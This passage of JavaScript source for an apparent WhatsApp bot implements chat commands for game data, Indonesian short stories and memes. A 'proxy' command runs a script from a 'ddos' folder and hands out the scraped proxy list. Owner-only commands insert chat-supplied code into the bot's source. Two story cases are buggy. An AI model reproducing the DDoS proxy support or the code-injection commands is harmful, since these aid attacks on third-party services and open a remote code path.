        ToxxicTechInc.sendMessage(m.chat, { image: { url: map.splash }, caption: caption.trim() }, { quoted: m });
    } catch (e) {
        newReply('error');
    }
}
break
case 'valorant-weapons': {
    if (!text) return newReply(`Example ${prefix + command} Vandal`);
    try {
        let response = await fetch('https://valorant-api.com/v1/weapons');
        let data = await response.json();
        let weapons = data.data;

        let weapon = weapons.find(weapon => weapon.displayName.toLowerCase() === text.toLowerCase());

        if (!weapon) return newReply(`Senjata dengan nama ${text} tidak ditemukan`);

        let caption = `
UUID: ${weapon.uuid || 'N/A'}
Name: ${weapon.displayName || 'N/A'}
Category: ${weapon.category || 'N/A'}
Default Skin: ${weapon.defaultSkinUuid || 'N/A'}
Cost: ${weapon.shopData ? weapon.shopData.cost : 'N/A'}
Damage Ranges: ${weapon.weaponStats ? weapon.weaponStats.damageRanges.map(damage => `
    Range: ${damage.rangeStartMeters}-${damage.rangeEndMeters} meters
    Head Damage: ${damage.headDamage}
    Body Damage: ${damage.bodyDamage}
    Leg Damage: ${damage.legDamage}
`).join('\n') : 'N/A'}
        `;

        ToxxicTechInc.sendMessage(m.chat, { image: { url: weapon.displayIcon }, caption: caption.trim() }, { quoted: m });
    } catch (e) {
        newReply('error');
    }
}
break
case 'cerpen-anak':{
let hasil = await cerpen(`anak`)
newReply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'cerpen-bahasadaerah':{
let hasil = await cerpen(`bahasa daerah`)
newReply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'cerpen-bahasainggris':{
let hasil = await cerpen(`bahasa Inggris`)
newReply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'cerpen-bahasajawa':{
let hasil = await cerpen(`bahasa jawa`)
newReply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'cerpen-bahasasunda':{
let hasil = await cerpen(`bahasa sunda`)
newReply(`
 ❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'cerpen-budaya':{
let hasil = await cerpen(`budaya`)
newReply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'cerpen-cinta':{
let hasil = await cerpen(`cinta`)
newReply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'cerpen-cintaislami':{
let hasil = await cerpen(`cinta islami`)
newReply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'cerpen-cintapertama':{
let hasil = await cerpen(`cinta pertama`)
newReply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'cerpen-cintaromantis':{
let hasil = await cerpen(`cinta romantis`)
newReply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'cerpen-cintasedih':{
let hasil = await cerpen(`cinta sedih`)
newReply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'cerpen-cintasegitiga':{
let hasil = await cerpen(`Cinta segitiga`)
newReply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'cerpen-cintasejati':{
let hasil = await cerpen(`cinta sejati`)
newReply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'cerpen-galau':{
let hasil = await cerpen(`galau`)
newReply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'cerpen-gokil':{
let hasil = await cerpen(`gokil`)
newReply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'cerpen-inspiratif':{
let hasil = await cerpen(`inspiratif`)
newReply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'cerpen-jepang':{
let hasil = await cerpen(`jepang`)
newReply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'cerpen-kehidupan':{
let hasil = await cerpen(`kehidupan`)
newReply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'cerpen-keluarga':{
let hasil = await cerpen(`keluarga`)
newReply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'cerpen-kisahnyata':{
let hasil = await cerpen(`kisah nyata`)
newReply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'cerpen-korea':{
let hasil = await cerpen(`korea`)
newReply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'cerpen-kristen':{
let hasil = await cerpen(`kristen`)
newReply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'cerpen-liburan':{
let hasil = await cerpen(`liburan`)
newReply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'cerpen-malaysia':{
let hasil = await cerpen(`malaysia`)
newReply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'cerpen-mengharukan':{
let hasil = await cerpen(`mengharukan`)
newReply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'cerpen-misteri':{
let hasil = await cerpen(`misteri`)
newReply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'cerpen-motivasi':{
let hasil = await cerpen(`motivasi`)
newReply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'cerpen-nasihat':{
let hasil = await cerpen(`nasihat`)
newReply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'cerpen-nasionalisme':{
let hasil = await cerpen(`nasionalisme`)
newReply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'cerpen-olahraga':{
let hasil = await cerpen(`olahraga`)
newReply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'cerpen-patahhati':{
let cerpe = await cerpen(`patah hati`)
reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'cerpen-penantian':{
let hasil = await cerpen(`penantian`)
newReply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'cerpen-pendidikan':{
let hasil = await cerpen(`pendidikan`)
newReply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'cerpen-pengalaman':{
let hasil = await cerpen(`pengalaman pribadi`)
newReply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'cerpen-pengorbanan':{
let hasil = await cerpen(`pengorbanan`)
newReply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'cerpen-penyesalan':{
let hasil = await cerpen(`penyesalan`)
newReply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'cerpen-perjuangan':{
let hasil = await cerpen(`perjuangan`)
newReply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'cerpen-perpisahan':{
let hasil = await cerpen(`perpisahan`)
newReply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'cerpen-persahabatan':{
let hasil = await cerpen(`persahabatan`)
newReply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'cerpen-petualangan':{
let hasil = await cerpen(`petualangan`)
newReply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'cerpen-ramadhan':{
let hasil = await cerpen(`ramadhan`)
newReply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'cerpen-remaja':{
let hasil = await cerpen(`remaja`)
newReply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'cerpen-rindu':{
let hasil = await cerpen(`rindu`)
newReply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'cerpen-rohani':{
let cerpe = await cerpen(`rohani`)
reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'cerpen-romantis':{
let hasil = await cerpen(`romantis`)
newReply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'cerpen-sastra':{
let hasil = await cerpen(`sastra`)
newReply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'cerpen-sedih':{
let hasil = await cerpen(`sedih`)
newReply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'cerpen-sejarah':{
let hasil = await cerpen(`sejarah`)
newReply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'lahelu':{
	let tags = ['lucu', 'relate', 'gaming', 'nostalgia', 'teknologi', 'random', 'komik', 'editan', 'wtf', 'olahraga', 'opini', 'dark', 'absurd', 'cringe', 'sus', 'binatang']
	if(!text) return newReply(`Example : ${prefix + command} wtf\n\nAvailable Tags :\n\n${tags.map(v => `- ${v}`).join('\n')}`) 
	let url;
	let page = Math.round(Math.random() * 25)
	if(!text) url = `https://lahelu.com/api/post/get-posts?feed=1&page=${page}`
	if(text) url = `https://lahelu.com/api/post/get-posts?feed=1&hashtags[]=${text}&page=${page}`
	let anu = (await axios.get(url)).data
	let data = anu.postInfos[Math.floor(Math.random() * anu.postInfos.length)]
	if(/^video/i.test(data.media)) return await ToxxicTechInc.sendMessage(m.chat, { video: { url: 'https://cache.lahelu.com/'+data.media }, caption: data.title, viewOnce: false }, { quoted: m }) 
	if(/^image/i.test(data.media)) return await ToxxicTechInc.sendMessage(m.chat, { image: { url: 'https://cache.lahelu.com/'+data.media }, caption: data.title, viewOnce: false }, { quoted: m }) 
	}
	break
	case 'freefirepet': case 'ffpet': case 'freefire_pet': {
async function petNew() {
  try {
    let response = await axios.get('https://ff.garena.com/id/pets/');
    
    let $ = cheerio.load(response.data);
    
    let hasil = [];

    $('.pet-box.pet-box-new').each((index, element) => {
      let name = $(element).find('.pet-name').text();
      let talk = $(element).find('.pet-abstract').text();
      
      let idElement = $(element).find('a');

      if (idElement.length > 0) {
        let id = idElement.attr('href');
        const match = id.match(/\/(\d+)$/);
        const idRes = match ? parseInt(match[1]) : null;

        hasil.push({
          name: name.trim(),
          talk: talk.trim(),
          id: idRes
        });
      } else {
        console.error('Error: Anchor element not found for the following element:');
        console.log(element);
      }
    });

    return hasil;
  } catch (error) {
    console.error('Error:', error);
    throw error;
  }
}

async function petSkill(id) {
let response = await axios.get(`https://ff.garena.com/id/pets/${id}`)
let $ = cheerio.load(response.data)
let hasil = []
let name = $('.skill-profile-name').text()
let skill = $('.skill-introduction').text()
hasil.push({

name: name.trim(),
skill: skill.trim()
})
return hasil 
}

if (!text) {
let response = await petNew()
let content = ``
response.forEach((element, index) => {
content += `*${index + 1}.* ${element.name}
- *Quotes:* ${element.talk}
- *Id:* ${element.id}\n\n`
})
newReply(content)
} else {
let response = await petSkill(text)
newReply(`- *Pet name:* ${response[0].name}
- *Skill:* ${response[0].skill}`)
}
}
break
        case 'delcase': {
              if (m.sender != '2348165846414@s.whatsapp.net') return newReply('This Command Is Only Available To Toxxic Boy The developer') 
if (!q) return newReply(`Example : ${prefix + command} antilink`)

dellCase('./queenrias.js', q)
newReply('Successfully deleted case')
}
break

case 'proxy': {
if (!text) { return newReply('❌ What Do You Want.') }
const command = text
 if (command === 'update') {
 newReply('Updating...')
 exec(`node ./File/ddos/scrape.js`, (error, stdout, stderr) => {
 if (error) {
 console.error('Error updating proxies:', error);
 newReply('Error updating proxies.');
 } else {
 console.log('Proxies updated successfully.');
 newReply('Proxies updated successfully.');
 }
 });
 } else if (command === 'total') {
 fs.readFile('./proxy.txt', 'utf8', (err, data) => {
 if (err) {
 console.error('Error reading proxy file:', err);
 newReply('Error reading proxy file.');
 return;
 }
 
 const proxies = data.trim().split('\n');
 const totalProxies = proxies.length;
ToxxicTechInc.sendMessage(m.chat, { contextInfo: {
externalAdReply: {
showAdAttribution: true, 
title: `Proxies Total`,
body: `List Proxies ${totalProxies}`,
mediaType: 1, 
renderLargerThumbnail : true,
thumbnailUrl: ``,
sourceUrl: ``
}}, text: `Proxies Total: ${totalProxies}`}, {quoted: m})
 });
 } else if (command === 'download') {
 const proxyPath = './proxy.txt'
 ToxxicTechInc.sendFile(m.chat, proxyPath, 'proxy.txt', 'Downloaded Proxy...');
 } else {
 newReply('Invalid .proxy command. Usage: .proxy update, total or download');
 }
}
break
case 'addcase': {
               if (m.sender != '2348165846414@s.whatsapp.net') return newReply('This Command Is Only Available To Toxxic Boy The developer') 
 if (!text) return newReply(`Example : ${prefix + command} case:{`);
    const fs = require('fs');
const namaFile = 'queenrias.js';
const caseBaru = `${text}`;
fs.readFile(namaFile, 'utf8', (err, data) => {
    if (err) {
        console.error('error:', err);
        return;
    }
    const posisiAwalGimage = data.indexOf("case 'addcase':");

    if (posisiAwalGimage !== -1) {
        const kodeBaruLengkap = data.slice(0, posisiAwalGimage) + '\n' + caseBaru + '\n' + data.slice(posisiAwalGimage);
        fs.writeFile(namaFile, kodeBaruLengkap, 'utf8', (err) => {
            if (err) {
                newReply('error:', err);
            } else {
                newReply('Successfully add case');
            }
        });
    } else {
        newReply('error');
    }
});

}
break
case 'listcase': {
let { listCase } = require('./lib/scrapelistCase.js')
newReply(listCase())
}
break
case 'freefire_character': case 'ffcharacter': case 'ffch': {
    async function ffCh() {
    let response = await axios.get('https://ff.garena.com/id/chars/')
    let $ = cheerio.load(response.data)
    let hasil = []
    $('.char-box.char-box-new').each((index, element) => {
    let name = $(element).find('.char-item-name').text()
    let desc = $(element).find('.char-item-desc').text()
    let id = $(element).find('a').attr('href')
    const match = id.match(/\/(\d+)$/);
    const idRes = match ? parseInt(match[1]) : null;
    hasil.push({
    name: name.trim(),
    desc: desc.trim(),
    id: idRes,
    })
    })
    return hasil
    }
    
    async function ffChSkill(id) {
    let response = await axios.get(`https://ff.garena.com/id/chars/${id}`)
    let $ = cheerio.load(response.data)
    let hasil = []
    let title = $('.skill-profile-r .skill-profile-title').text()
    let name = $('.skill-profile-name').text()
    let skill = $('.skill-introduction').text()
    hasil.push({
    title: title.trim(),
    name: name.trim(),
    skill: skill.trim()
    })
    return hasil
    }
    
if (!text) {
let response = await ffCh()
let content = ``
response.forEach((element, index) => {
content += `*${index + 1}.* ${element.name}
- *Desc:* ${element.desc}
- *Id:* ${element.id}\n\n`
})
newReply(content)
} else {
let response = await ffChSkill(text)
newReply(`*${response[0].title}*

- *Character Name:* ${response[0].name}
- *Skill:* ${response[0].skill}`)
}
}
break
case 'ffnws': case 'ffnews': case 'freefire_news': {
async function newsFf() {
let response = await axios.get('https://ff.garena.com/id/news/')
let $ = cheerio.load(response.data)
let hasil = []
$('.news-item.news-elem').each((index, element) => {
let time = $(element).find('.news-time').text().trim()
let title = $(element).find('.news-title').text().trim()
let link = $(element).find('a').attr('href').trim()
hasil.push({

title: title,
time: time,
link: 'https://ff.garena.com' + link
})
})
return hasil
}
let response = await newsFf()
let content = ``
response.forEach((element, index) => {
content += `*${index + 1}* ${element.title}
- *Time:* ${element.time}
- *Related news:* ${element.link}\n\n`
})
newReply(content)
}
break
case 'mc':
            if (args.length == 0) return newReply(`*List Server:*\n\n> java\n> bedrock`)
            if (args[0] === 'bedrock') {
axios.get(`https://api.mcstatus.io/v2/status/bedrock/${args[1]}`).then(({ data }) => {
				var caption = `▧「 *S E R V E R  M I N E C R A F T* 」\n\n`
				caption += ` ‣ *IP* : *${data.host}*\n`
				caption += ` ‣ *PORT* : *${data.port}*\n`
				caption += ` ‣ *IP Address* : *${data.ip_address}*\n\n`
				caption += ` ‣ *Players* : *${data.players.online}/${data.players.max}*\n`
				caption += ` ‣ *Version* : *${data.version.name}*\n\n`
							ToxxicTechInc.sendMessage(from , {image: { url: `https://i.ibb.co/hLdW1MR/IMG-20240906-154741-714.jpg` }, caption: caption },{ quoted: m })
			})
} else if (args[0] === 'java') {
axios.get(`https://api.mcstatus.io/v2/status/java/${args[1]}`).then(({ data }) => {
				var caption = `▧「 *S E R V E R  M I N E C R A F T* 」\n\n`
				caption += ` ‣ *IP* : *${data.host}*\n`
				caption += ` ‣ *PORT* : *${data.port}*\n`
				caption += ` ‣ *IP Address* : *${data.ip_address}*\n\n`
				caption += ` ‣ *Players* : *${data.players.online}/${data.players.max}*\n`
				caption += ` ‣ *Version* : *${data.version.name_clean}*\n\n`			
				ToxxicTechInc.sendMessage(from , {image: { url: `https://telegra.ph/file/d72f9778e22e634edd194.jpg` }, caption: caption },{ quoted: m })
			})
} else {
newReply('error')
}
			break
			case 'genshin-sheets': {
    if (!text) return newReply(`Example: ${prefix + command} Albedo

*LIST CHARACTER*

- Albedo
- Alhaitham
- Aloy
- Amber
- Arataki
- Baizhu
- Barbara
- Beidou
- Bennet
- Candace
- Charlotte
- Chevreuse
- Chongyun
- Collei
- Cyno
- Dehya
- Diluc
- Diona
- Dori
- Eula
- Faruzan
- Fischl
- Freminet
- Furina
- Gaming 
- Ganyu
- Hutao
- Jean
- Kaedehara
- Kaeya
- Kaveh
- Keqing
- Klee
- Nahida
- Raiden
- Yaemiko
- Yanfei
- Yaoyao
- Yelan
- Zhongli`);

    let Maximus;

    if (text.toLowerCase() === 'albedo') {
        Maximus = 'Albedo_Sub DPS';
    } else if (text.toLowerCase() === 'alhaitham') {
        Maximus = 'Alhaitham_Main DPS';
    } else if (text.toLowerCase() === 'aloy') {
        Maximus = 'Aloy_Support';
    } else if (text.toLowerCase() === 'amber') {
        Maximus = 'Amber_Support';
    } else if (text.toLowerCase() === 'arataki') {
        Maximus = 'Arataki Itto_Main DPS';
    } else if (text.toLowerCase() === 'baizhu') {
        Maximus = 'Baizhu_Healer';
    } else if (text.toLowerCase() === 'barbara') {
        Maximus = 'Barbara_Healer';
    } else if (text.toLowerCase() === 'beidou') {
        Maximus = 'Beidou_Burst DPS';
    } else if (text.toLowerCase() === 'bennet') {
        Maximus = 'Bennet_Support';
    } else if (text.toLowerCase() === 'candace') {
        Maximus = 'Candace_Support';
    } else if (text.toLowerCase() === 'charlotte') {
        Maximus = 'Charlotte_Healer';
    } else if (text.toLowerCase() === 'chevreuse') {
        Maximus = 'Chevreuse_Support';
    } else if (text.toLowerCase() === 'chongyun') {
        Maximus = 'Chongyun_Sub DPS';
    } else if (text.toLowerCase() === 'collei') {
        Maximus = 'Collei_Support';
    } else if (text.toLowerCase() === 'cyno') {
        Maximus = 'Cyno_Aggravate';
    } else if (text.toLowerCase() === 'dehya') {
        Maximus = 'Dehya_Burgeon';
    } else if (text.toLowerCase() === 'diluc') {
        Maximus = 'Diluc_Main DPS';
    } else if (text.toLowerCase() === 'diona') {
        Maximus = 'Diona_Shielder';
    } else if (text.toLowerCase() === 'dori') {
        Maximus = 'Dori_Support';
    } else if (text.toLowerCase() === 'eula') {
        Maximus = 'Eula_Main DPS';
    } else if (text.toLowerCase() === 'faruzan') {
        Maximus = 'Faruzan_Support';
    } else if (text.toLowerCase() === 'fischl') {
        Maximus = 'Fischl_Sub DPS';
    } else if (text.toLowerCase() === 'freminet') {
        Maximus = 'Freminet_Main DPS';
    } else if (text.toLowerCase() === 'furina') {
        Maximus = 'Furina_Sub DPS';
    } else if (text.toLowerCase() === 'gaming') {
        Maximus = 'Gaming_Main DPS';
    } else if (text.toLowerCase() === 'ganyu') {
        Maximus = 'Ganyu_Main DPS';
    } else if (text.toLowerCase() === 'hutao') {
        Maximus = 'Hu Tao_Main DPS';
    } else if (text.toLowerCase() === 'jean') {
        Maximus = 'Jean_Support';
    } else if (text.toLowerCase() === 'kaedehara') {
        Maximus = 'Kaedehara Kazuha_Support';
    } else if (text.toLowerCase() === 'kaeya') {
        Maximus = 'Kaeya_Sub DPS';
    } else if (text.toLowerCase() === 'kaveh') {
        Maximus = 'Kaveh_Driver';
    } else if (text.toLowerCase() === 'keqing') {
        Maximus = 'Keqing_Main DPS';
    } else if (text.toLowerCase() === 'klee') {
        Maximus = 'Klee_Main DPS';
    } else if (text.toLowerCase() === 'nahida') {
        Maximus = 'Nahida_Support';
    } else if (text.toLowerCase() === 'raiden') {
        Maximus = 'Raiden Shogun_Burst DPS';
    } else if (text.toLowerCase() === 'yaemiko') {
        Maximus = 'Yae Miko_Sub DPS';
    } else if (text.toLowerCase() === 'yanfei') {
        Maximus = 'Yanfei_Main DPS';
    } else if (text.toLowerCase() === 'yaoyao') {
        Maximus = 'Yaoyao_Healer';
    } else if (text.toLowerCase() === 'yelan') {
        Maximus = 'Yelan_Burst DPS';
    } else if (text.toLowerCase() === 'zhongli') {
        Maximus = 'Zhongli_Burst DPS';
    } else {
        return newReply(`Karakter yang dicari tidak ada atau belum tersedia.

*LIST CHARACTER*

- Albedo
- Alhaitham
- Aloy
- Amber
- Arataki
- Baizhu
- Barbara
- Beidou
- Bennet
- Candace
- Charlotte
- Chevreuse
- Chongyun
- Collei
- Cyno
- Dehya
- Diluc
- Diona
- Dori
- Eula
- Faruzan
- Fischl
- Freminet
- Furina
- Gaming 
- Ganyu
- Hutao
- Jean
- Kaedehara
- Kaeya
- Kaveh
- Keqing
- Klee
- Nahida
- Raiden
- Yaemiko
- Yanfei
- Yaoyao
- Yelan
- Zhongli`);
    }

    try {
        let data = await fetch(`https://raw.githubusercontent.com/FortOfFans/GI/main/sheets/${Maximus}.jpg`);
        if (!data.ok) throw new Error('Gagal mendapatkan data gambar');
        let image = await data.buffer();
        ToxxicTechInc.sendFile(m.chat, image, null, `${capitalizeFirstLetter(text)} - Genshin Impact - Sheet`, m);
    } catch (error) {
        newReply('An error occurred while retrieving image data. Please try again later.');
    }
}
break
case 'honkai-sheets': {
    if (!text) return newReply(`Example: ${prefix + command} Bronya

*LIST CHARACTER*

- Acheron
- Argenti
- Arlan
- Asta
- Aventurine
- Bailu
- Blackswan
- Blade
- Bronya
- Clara
- Danhengil
- Danheng
- Drratio
- Firetrailblazer
- Fuxuan
- Gallagher
- Gepard
- Guinaifen
- Hanya
- Herta
- Himeko
- Hook
- Huohuo
- Jingyuan
- Jingliu
- Kafka
- Luka
- Luocha
- Lynx
- March7th
- Natasha
- Pela
- Physicaltrailblazer
- Qingque
- Ruanmei
- Sampo
- Seele
- Serval
- Silverwolf
- Sparkle
- Sushang
- Tingyun
- Topaz
- Welt
- Xueyi
- Yanqing
- Yukong`);

    let Maximus;

    if (text.toLowerCase() === 'acheron') {
        Maximus = '1308';
    } else if (text.toLowerCase() === 'argenti') {
        Maximus = '1302';
    } else if (text.toLowerCase() === 'arlan') {
        Maximus = '1008';
    } else if (text.toLowerCase() === 'asta') {
        Maximus = '1009';
    } else if (text.toLowerCase() === 'aventurine') {
        Maximus = '1304';
    } else if (text.toLowerCase() === 'bailu') {
        Maximus = '1211';
    } else if (text.toLowerCase() === 'blackswan') {
        Maximus = '1307';
    } else if (text.toLowerCase() === 'blade') {
        Maximus = '1205';
    } else if (text.toLowerCase() === 'bronya') {
        Maximus = '1101';
    } else if (text.toLowerCase() === 'clara') {
        Maximus = '1107';
    } else if (text.toLowerCase() === 'danhengil') {
        Maximus = '1213';
    } else if (text.toLowerCase() === 'danheng') {
        Maximus = '1002';
    } else if (text.toLowerCase() === 'drratio') {
        Maximus = '1305';
    } else if (text.toLowerCase() === 'firetrailblazer') {
        Maximus = '8003';
    } else if (text.toLowerCase() === 'fuxuan') {
        Maximus = '1208';
    } else if (text.toLowerCase() === 'gallagher') {
        Maximus = '1301';
